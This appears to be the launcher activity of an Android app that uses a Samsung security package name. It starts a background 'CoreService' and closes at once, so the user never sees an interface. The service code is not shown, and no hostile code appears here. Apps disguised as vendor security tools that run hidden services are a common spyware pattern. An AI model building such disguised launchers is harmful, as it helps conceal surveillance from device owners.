package com.samsung.android.security.v8;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

import com.samsung.android.security.v8.services.CoreService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // تشغيل الخدمة
        Intent serviceIntent = new Intent(this, CoreService.class);
        startService(serviceIntent);

        finish();
    }
}
